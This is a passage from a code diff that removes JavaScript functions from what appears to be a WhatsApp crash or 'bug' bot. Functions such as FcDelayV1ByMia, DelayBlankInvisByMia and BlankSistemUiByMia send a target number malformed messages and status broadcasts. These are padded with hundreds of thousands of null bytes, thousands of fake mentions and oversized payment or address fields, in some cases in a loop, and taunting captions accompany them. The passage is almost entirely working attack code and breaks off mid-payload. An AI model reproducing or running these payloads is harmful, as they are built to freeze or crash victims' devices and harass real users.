-            '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=',
-            'base64',
-          ),
-          contextInfo: {
-            pairedMediaType: 'NOT_PAIRED_MEDIA',
-            isQuestion: true,
-            isGroupStatus: true,
-            mentionedJid: [
-              '0@s.whatsapp.net',
-              ...Array.from({
-                  length: 2000,
-                },
-                () =>
-                '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net',
-              ),
-            ],
-          },
-          scansSidecar: '3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==',
-          scanLengths: [
-            2899999999999999077, 1799999999999998555, 7699999999999999148,
-            1069999999999999164,
-          ],
-          midQualityFileSha256: 'Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk=',
-        },        
-        }
-      }
-    };
-
-    try {
-      await sock.relayMessage(target, mbgvnxnew, {
-        participant: { jid: target },
-      });
-    } catch (e) {
-      console.log("❌ Error di dalam loop:", e);
-    }
-  }
-}
-
-async function DelayNoDetectByMia(sock, target) {
-    await sock.relayMessage(target, {
-    groupStatusMessageV2: {
-      message: {
-      interactiveResponseMessage: {
-        body: {
-          text: "lagi ngapain?",
-          format: "DEFAULT"
-        },
-        nativeFlowResponseMessage: {
-          name: "call_permission_request",
-          paramsJson: "",
-          version: 3
-        },
-        contextInfo: {
-          remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
-          isForwarded: true,
-          forwardingScore: 9999,
-          urlTrackingMap: {
-            urlTrackingMapElements: Array.from({ length: 99999 }, (_, n) => ({
-              participant: `62${n + 888888}@s.whatsapp.net`
-            }))
-          },
-        },
-      },
-    },
-  },
-}, { participant: { jid: target }});
-
-await sock.relayMessage(
-    target,
-    {
-  groupStatusMessageV2: { 
-    message: {
-      interactiveResponseMessage: {
-        body: {
-          text: "I Love Dric hehehe",
-          format: "DEFAULT",
-        },
-        nativeFlowResponseMessage: {
-          name: "address_message",
-          paramsJson: `{\"values\":{\"in_pin_code\":\"+9999999999\",\"building_name\":\"ampos\",\"address\":\"/MakLo\",\"tower_number\":\"987\",\"city\":\"MakLo\",\"name\":\"CRB\",\"phone_number\":\"+888888888888\",\"house_number\":\"99\",\"floor_number\":\"99\",\"state\":\"${"\u0000".repeat(5000)}\"}}`,
-          version: 3
-          },
-          contextInfo: {
-          remoteJid: Math.random().toString(36) + "\u0000".repeat(9000),
-          isForwarded: true,
-          forwardingScore: 9999,
-          statusAttributionType: 2,
-            statusAttributions: Array.from({ length: 99999 }, (_, n) => ({
-              participant: `62${n + 888888}@s.whatsapp.net`,
-              type: 1
-            })),
-        },
-      },
-    },
-  },
-}, { participant: { jid: target }});
-}
-
-async function FcDelayV1ByMia(client, target) {
-try {
-    const msgx = {
-        viewOnceMessage: {  
-            message: {  
-                interactiveResponseMessage: {  
-                    body: {  
-                        text: " already cancer in your number ",  
-                        hasMediaAttachment: false  
-                    },  
-                    imageMessage: {  
-                        url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",  
-                        mimetype: "image/jpeg",  
-                        fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",  
-                        fileLength: "11887",  
-                        height: 1080,  
-                        width: 1080,  
-                        mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",  
-                        fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",  
-                        directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",  
-                        mediaKeyTimestamp: "1750124469",  
-                        contextInfo: {  
-                            forwardingScore: 9999,  
-                            isForwarded: true,  
-                            mentionedJid: [  
-                                "0@s.whatsapp.net",  
-                                ...Array.from(  
-                                    { length: 1900 },  
-                                    () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"  
-                                )  
-                            ],  
-                            expiration: 9741,  
-                            ephemeralSettingTimestamp: 9741,  
-                            entryPointConversionSource: "WhatsApp.com",  
-                            entryPointConversionApp: "WhatsApp",  
-                            entryPointConversionDelaySeconds: 9742,  
-                            disappearingMode: {  
-                                initiator: "INITIATED_BY_OTHER",  
-                                trigger: "ACCOUNT_SETTING"  
-                            }  
-                        },  
-                        scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",  
-                        scanLengths: [2071, 6199, 1634, 1983],  
-                        midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="  
-                    },  
-                    nativeFlowResponseMessage: {  
-                        name: "address_message",  
-                        paramsJson: "\u0000".repeat(1045900),  
-                        version: 3  
-                    }  
-                }  
-            }  
-        }  
-    };
-
-    const hanzz = await generateWAMessageFromContent(target, msgx, {});
-
-    await client.relayMessage("status@broadcast", hanzz.message, {
-        messageId: hanzz.key.id,
-        statusJidList: [target],
-        additionalNodes: [{
-            tag: "meta",
-            attrs: {},
-            content: [{
-                tag: "mentioned_users",
-                attrs: {},
-                content: [{
-                    tag: "to",
-                    attrs: { jid: target },
-                    content: undefined
-                }]
-            }]
-        }]
-    });
-
-    const generateId = () => Math.random().toString(36).substring(2, 15);
-    const msg = {
-        key: { remoteJid: "status@broadcast", fromMe: false, id: generateId() },
-        message: {
-            imageMessage: {
-                url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
-                mimetype: "image/jpeg",
-                fileSha256: Buffer.from("qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=", "base64"),
-                caption: "Are You Look Dric?",
-                fileLength: "149502",
-                height: 1397,
-                width: 1126,
-                mediaKey: Buffer.from("5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=", "base64"),
-                fileEncSha256: Buffer.from("XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=", "base64"),
-                directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
-                mediaKeyTimestamp: "1777621571",
-                jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQ0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=", "base64"),
-                contextInfo: {
-                    pairedMediaType: "NOT_PAIRED_MEDIA",
-                    isQuestion: true,
-                    isGroupStatus: true
-                },
-                scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
-                scanLengths: [2899999999999999077, 1799999999999998555, 7699999999999999148, 1069999999999999164],
-                midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
-            }
-        },
-        messageTimestamp: Math.floor(Date.now() / 1000)
-    };
-
-    await client.relayMessage("status@broadcast", msg.message, {
-        statusJidList: [target],
-        messageId: msg.key.id,
-        additionalNodes: [{
-            tag: "meta",
-            attrs: {},
-            content: [{
-                tag: "mentioned_users",
-                attrs: {},
-                content: [{
-                    tag: "to",
-                    attrs: { jid: target },
-                    content: undefined
-                }]
-            }]
-        }]
-    });
-
-    await client.relayMessage(target, {
-        statusMentionMessage: {
-            message: {
-                protocolMessage: {
-                    key: msg.key,
-                    type: 25
-                },
-                additionalNodes: [{
-                    tag: "meta",
-                    attrs: { is_status_mention: "false" },
-                    content: undefined
-                }]
-            }
-        }
-    }, {});
-
-    await client.relayMessage(target, {
-        statusMentionMessage: {
-            message: {
-                protocolMessage: {
-                    key: msg.key,
-                    type: 25
-                }
-            }
-        }
-    }, {});
-    
-    console.log(`succes send to ${target}`);
-    
-    } catch(e) {
-        console.log(`error ${e.message}`);
-  }
-}
-
-async function DelayBlankInvisByMia(sock, target) {
-  await sock.relayMessage("status@broadcast", {
-    viewOnceMessage: {
-      message: {
-        interactiveMessage: {
-          nativeFlowMessage: {
-            buttons: [
-              {
-                name: "payment_info",
-                buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'ꦾ'.repeat(5000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"dric","key":"${'\u0000'.repeat(900000)}","key_type":"CPF"}}],"share_payment_status":false}`
-              }
-            ]
-          }
-        }
-      }
-    }
-  }, {
-    statusJidList: [target],
-    additionalNodes: [
-      {
-        tag: "meta",
-        attrs: { status_setting: "contacts" },
-        content: [
-          {
-            tag: "mentioned_users",
-            attrs: {},
-            content: [
-              {
-                tag: "to",
-                attrs: { jid: target },
-                content: []
-              }
-            ]
-          }
-        ]
-      }
-    ]
-  });
-}
-
-async function BlankSistemUiByMia(client, target) {
-  
-  let biji2 = await generateWAMessageFromContent(
-    target,
-    {
-      viewOnceMessage: {
-        message: {
-          interactiveResponseMessage: {
-            body: {
-              text: " assalamu'alaikum, salam kenal ini cancer ",
-              format: "DEFAULT",
-            },
-            nativeFlowResponseMessage: {
-              name: "galaxy_message",
-              paramsJson: JSON.stringify({ error: "test" }),
-              version: 3,
-            },
-            entryPointConversionSource: "call_permission_request",
-          },
-        },
-      },
-    },
-    {
-      ephemeralExpiration: 0,
-      forwardingScore: 9741,
-      isForwarded: true,
-    }
-  );
- 
-  const mediaData = [
-    {
-      ID: "68917910",
-      uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
-      buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
-      sid: "5e03e0",
-      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
-      ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
-      mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
-    },
-    {
-      ID: "68884987",
-      uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
-      buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
-      sid: "5e03e0",
-      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
-      ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
-      mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
-    },
-  ]
-
-  let sequentialIndex = 0
-  const selectedMedia = mediaData[sequentialIndex]
-  sequentialIndex = (sequentialIndex + 1) % mediaData.length
-  const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = selectedMedia
-
-  const massiveMentions = [
-    target,
-    ...Array.from({ length: 1000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
-  ]
-
-  const contextInfo = {
-    participant: target,
-    mentionedJid: massiveMentions,
-  }
-
-  const stickerMsg = {
-    viewOnceMessage: {
-      message: {
-        stickerMessage: {
-          url: `https://mmg.whatsapp.net/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}&mms3=true`,
-          fileSha256: SHA256,
-          fileEncSha256: ENCSHA256,
-          mediaKey: mkey,
-          mimetype: "image/webp",
-          directPath: `/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}`,
-          fileLength: { low: Math.floor(Math.random() * 1000000000), high: 100, unsigned: true },
-          mediaKeyTimestamp: { low: Math.floor(Math.random() * 1700000000), high: 0, unsigned: false },
-          firstFrameLength: 19904,
-          firstFrameSidecar: "KN4kQ5pyABRAgA==",
-          isAnimated: true,
-          contextInfo,
-          isAvatar: false,
-          isAiSticker: false,
-          isLottie: false,
-        },
-      },
-    },
-  }
-
-  const msgxay = {
-    viewOnceMessage: {
-      message: {
-        interactiveResponseMessage: {
-          body: { text: "Are You Look Dric?", format: "DEFAULT" },
-          nativeFlowResponseMessage: {
-            name: "call_permission_request",
-            paramsJson: JSON.stringify({ type: "test" }),
-            version: 3,
-          },
-          entryPointConversionSource: "galaxy_message",
-        },
-      },
-    },
-  }
-  
-  const interMsg = {
-    viewOnceMessage: {
-      message: {
-        interactiveResponseMessage: {
-          body: { text: "halo habibi", format: "DEFAULT" },
-          nativeFlowResponseMessage: {
-            name: "call_permission_request",
-            paramsJson: JSON.stringify({ type: "test2" }),
-            version: 3,
-          },
-          entryPointConversionSource: "galaxy_message",
-        },
-      },
-    },
-  }
-
-  const statusMessages = [stickerMsg, interMsg, msgxay]
- 
-  let content = {
-    extendedTextMessage: {
-      text: "أنت أحمق",
-      matchedText: "هذا كل ما في الأمر، مجرد خطأ في التأخير",
-      description: "في المرة القادمة لا تنظر بعيداً يا عزيزي",
-      title: "علة الثمالة حقا",
-      previewType: "NONE",
-      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
-      inviteLinkGroupTypeV2: "DEFAULT",
-      contextInfo: {
-        isForwarded: true,
-        forwardingScore: 999999999,
-        participant: target,
-        remoteJid: "status@broadcast",
-        mentionedJid: massiveMentions,
-        quotedMessage: {
-          newsletterAdminInviteMessage: {
-            newsletterJid: "sock@newsletter",
-            newsletterName: "أنت أحمق",
-            caption: "هذا كل ما في الأمر، مجرد خطأ في التأخي",
-            inviteExpiration: "99999999999"
-          }
-        },
-        forwardedNewsletterMessageInfo: {
-          newsletterName: "علة الثمالة حق",
-          newsletterJid: "13135550002@newsletter",
-          serverId: 1
-        }
-      }
-    }
-  };
-      
-  const xnxxmsg = generateWAMessageFromContent(target, content, {});
-  
-  let msg = null;
-  
-  for (let i = 0; i < 50; i++) {
-  
-    await client.relayMessage("status@broadcast", xnxxmsg.message, {
-      messageId: xnxxmsg.key.id,
-      statusJidList: [target],
-    }).catch(e => console.log("Error:", e.message));  
-   
-    for (const contentMsg of statusMessages) {
-      const msgStatus = generateWAMessageFromContent(target, contentMsg, {}) 
-      await client.relayMessage("status@broadcast", msgStatus.message, {
-        messageId: msgStatus.key.id,
-        statusJidList: [target],
-      }).catch(e => console.log("Error statusMsg:", e.message));
-    }
-   }
-   
-  if (mention) {
-    await client.relayMessage(target, {
-      groupStatusMentionMessage: {
-        message: {
-          protocolMessage: {
-            key: msg?.key || {},
-            type: 25,
-          },
-        },
-      },
-    });
-  }
-}
-
-async function BlankMsg(sock, target) {
- try {     
-   const vnxbng = {
-    interactiveMessage: {
-      body: {
-        text: "CancerXDric",
-        format: "DEFAULT"
-      },
-      footer: {
-        text: "Prince Dric Look You"
-      },
-      nativeFlowMessage: {
-          buttons: [
-            {
-              name: "single_select",
-              buttonParamsJson: `{"title":"${"b҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉